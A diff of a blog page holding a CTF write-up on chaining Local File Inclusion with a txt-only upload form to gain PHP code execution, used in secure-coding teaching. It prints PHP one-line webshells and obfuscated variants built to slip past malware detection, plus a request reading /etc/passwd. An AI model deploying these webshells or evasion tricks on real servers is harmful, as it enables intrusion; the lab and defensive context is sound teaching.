@@ -98,7 +98,7 @@
   },
   "articleSection": "posts",
   "keywords": ["LFI","RCE","Write Up","Challenges","File Upload","Surabaya Hacker Link"],
-  "wordCount":  855 ,
+  "wordCount":  867 ,
   "datePublished": "2019-05-09T00:00:00Z",
   "dateModified": "2019-05-09T00:00:00Z"
 }
@@ -214,6 +214,7 @@
 
 <div class="content post__content clearfix">
 			<p>This challenge was created when I was confused about how to explain the LFI bug Local File Inclusion during a secure coding session at <a href="https://stts.edu">STTS</a>. Since I was quite bored with LFI to Local File Read via wrapper, I searched for LFI to RCE methods other than through <code>self/proc/environ</code> and found LFI to RCE via Access Log Poisoning. However, because hosting environments could not read log files in txt format, a file upload feature was created that only allows txt files. Below is the Write Up.</p>
+<h2 id="gathering-information-and-scanning">Gathering Information and Scanning</h2>
 <p><img src="/img/ramadhan/1.webp" alt="initial view">
 Above is the view when reading lorem ipsum. In the URL there is a page parameter with the value loremipsum.html. This also applies when reading twice.</p>
 <p><img src="/img/ramadhan/2.webp" alt="reading /etc/passwd">
@@ -227,6 +228,7 @@ We immediately tried reading the file /etc/passwd and it worked. It is clear tha
 </span></span></code></pre></div><p>From the error message when changing the page parameter to an invalid value, after trying many methods to gain access such as RFI Remote File Inclusion, wrapper, and others, everything failed. This failed because there is the word article in front before the page parameter input, which prevents RFI and wrapper usage.</p>
 <p><img src="/img/ramadhan/3.webp" alt="content of robots.txt"><br>
 Opened the terminal and searched for other folders using gobuster with a common web files wordlist, and found robots.txt and the uploads directory. In robots.txt there is Disallow: uploads/. We directly accessed that directory and found an upload form.</p>
+<h2 id="exploitation">Exploitation</h2>
 <p><img src="/img/ramadhan/4.webp" alt="file too big"><br>
 Tried uploading a PHP webshell but it failed because the file was too large.</p>
 <p><img src="/img/ramadhan/5.webp" alt="php one line web shell"><br>
@@ -251,6 +253,7 @@ After further research, it turns out PHP can run using the tag <code>&lt;?=</cod
 The file ran but there was no interaction because it required the param or index <code>c</code>.</p>
 <p><img src="/img/ramadhan/16.webp" alt="success"><br>
 Added the param or index <code>c</code> and it worked.</p>
+<h2 id="gaining-access">Gaining Access</h2>
 <p><img src="/img/ramadhan/17.webp" alt="writing nickname to solver.txt"><br>
 Write nick to solver.txt <code>echo &quot;nick&quot; &gt;&gt; solver.txt</code></p>
 <p><img src="/img/ramadhan/18.webp" alt="nick written"><br>
@@ -269,6 +272,7 @@ Nick successfully written.</p>
 </div>
 
 
+<h2 id="bypassing-shell-detection-method">Bypassing Shell Detection Method</h2>
 <p>When this challenge was solved by friends in the SHL group, it was quite interesting because many did not use <code>`</code> to write the nick. Some used PHP command execution techniques and several evasion tricks so the txt file would not be detected as malware or virus when uploaded, such as:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?=@</span>$_GET[<span style="color:#a6e22e">a</span>]($_GET[<span style="color:#a6e22e">b</span>])<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
 </span></span></span></code></pre></div><p>The @ symbol disables error display. There are 2 parameters a and b, where parameter b is inside parentheses after parameter a. So the player makes a request <code>https://challshl/?page=../uploads/x.txt&amp;a=system&amp;b=id</code> , equivalent to: <code>&lt;?php system('id') ?&gt;</code>
@@ -292,6 +296,7 @@ Then the system function is executed because shell functions are not disabled in
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> $shell($cmd);
 </span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
 </span></span></span></code></pre></div><p>The string szhezlzl_ezxezc becomes shell_exec after removing the letter z using str_replace(), allowing the function to execute.</p>
+<h2 id="conclusion">Conclusion</h2>
 <p>There are many tips and tricks to evade detection so webshell or backdoor files are not detected by WAF or manual sanitization. As prevention, shell functions such as system, shell_exec, and others should be disabled via php.ini.</p>
 <p>If you want to try this simple challenge, you can build a simple lab. The source code can be downloaded at <a href="https://github.com/laztname/notAcms">here</a> and the video version can be watched <a href="https://youtu.be/qqarbngfrNk">here</a>.</p>
 <p>That is all, see you on the next challenge.</p>
@@ -485,9 +490,8 @@ Then the system function is executed because shell functions are not disabled in
 		<a class="widget-taglist__link widget__link btn" href="/en/tags/virtual-machine/" title="Virtual Machine">Virtual Machine (1)</a>
 		<a class="widget-taglist__link widget__link btn" href="/en/tags/web-hacking/" title="Web Hacking">Web Hacking (2)</a>
 		<a class="widget-taglist__link widget__link btn" href="/en/tags/windows/" title="Windows">Windows (1)</a>
-		<a class="widget-taglist__link widget__link btn" href="/en/tags/wordpress/" title="Wordpress">Wordpress (1)</a>
+		<a class="widget-taglist__link widget__link btn" href="/en/tags/wordpress/" title="Wordpress">Wordpress (2)</a>
 		<a class="widget-taglist__link widget__link btn" href="/en/tags/write-up/" title="Write Up">Write Up (35)</a>
-		<a class="widget-taglist__link widget__link btn" href="/en/tags/wrodpress/" title="Wrodpress">Wrodpress (1)</a>
 		<a class="widget-taglist__link widget__link btn" href="/en/tags/xss/" title="XSS">XSS (3)</a>
 		<a class="widget-taglist__link widget__link btn" href="/en/tags/zimbra-mail-server/" title="Zimbra Mail Server">Zimbra Mail Server (1)</a>
 	</div>
